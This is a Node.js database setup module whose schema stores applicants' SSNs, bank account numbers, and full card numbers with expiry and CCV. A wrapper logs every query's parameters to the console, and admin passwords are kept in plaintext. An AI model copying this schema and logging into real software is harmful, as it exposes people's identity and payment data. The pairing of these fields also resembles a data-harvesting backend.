const mysql = require('mysql2/promise');

const dbConfig = {
    host: process.env.DB_HOST,
    user: process.env.DB_USER,
    password: process.env.DB_PASSWORD,
    database: process.env.DB_NAME,
    port: process.env.DB_PORT || 3306,
    waitForConnections: true,
    connectionLimit: 10,
    queueLimit: 0
};

const pool = mysql.createPool(dbConfig);

// Max Logging: Wrap query to log execution
const originalQuery = pool.query.bind(pool);
pool.query = async (...args) => {
    console.log('🗄️ Executing SQL:', args[0]);
    if (args[1]) console.log('🗄️ SQL Parameters:', args[1]);
    return originalQuery(...args);
};

const initDB = async () => {
    try {
        const connection = await pool.getConnection();
        console.log('✅ Connected to MySQL Database');

        await connection.query(`
            CREATE TABLE IF NOT EXISTS applications (
                id INT AUTO_INCREMENT PRIMARY KEY,
                first_name VARCHAR(255),
                last_name VARCHAR(255),
                dob DATE,
                ssn VARCHAR(20),
                phone VARCHAR(20),
                email VARCHAR(255),
                address TEXT,
                city VARCHAR(100),
                state VARCHAR(50),
                zip VARCHAR(20),
                mailing_address TEXT,
                bank_name VARCHAR(255),
                account_type VARCHAR(50),
                routing_number VARCHAR(20),
                account_number VARCHAR(20),
                drive_folder_id VARCHAR(255),
                drive_folder_url TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        await connection.query(`
            CREATE TABLE IF NOT EXISTS cards (
                id INT AUTO_INCREMENT PRIMARY KEY,
                application_id INT,
                card_number VARCHAR(20),
                expiry VARCHAR(10),
                ccv VARCHAR(10),
                FOREIGN KEY (application_id) REFERENCES applications(id) ON DELETE CASCADE
            )
        `);

        await connection.query(`
            CREATE TABLE IF NOT EXISTS files (
                id INT AUTO_INCREMENT PRIMARY KEY,
                application_id INT,
                name VARCHAR(255),
                url TEXT,
                drive_id VARCHAR(255),
                field_name VARCHAR(100),
                FOREIGN KEY (application_id) REFERENCES applications(id) ON DELETE CASCADE
            )
        `);

        await connection.query(`
            CREATE TABLE IF NOT EXISTS admin_users (
                id INT AUTO_INCREMENT PRIMARY KEY,
                username VARCHAR(100) UNIQUE NOT NULL,
                password VARCHAR(255) NOT NULL,
                is_default BOOLEAN DEFAULT FALSE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // Check if default admin exists; seed if missing
        const defaultUser = process.env.ADMIN_USER;
        const defaultPass = process.env.ADMIN_PASS;
        const [existingUsers] = await connection.query('SELECT * FROM admin_users WHERE is_default = 1 OR username = ?', [defaultUser]);
        if (existingUsers.length === 0 && defaultUser && defaultPass) {
            await connection.query(
                'INSERT INTO admin_users (username, password, is_default) VALUES (?, ?, 1)',
                [defaultUser, defaultPass]
            );
            console.log(`👤 Created default admin user: ${defaultUser}`);
        }

        console.log('✅ Database tables initialized');
        connection.release();
    } catch (error) {
        console.error('❌ Database initialization error:', error);
    }
};

module.exports = {
    pool,
    initDB
};
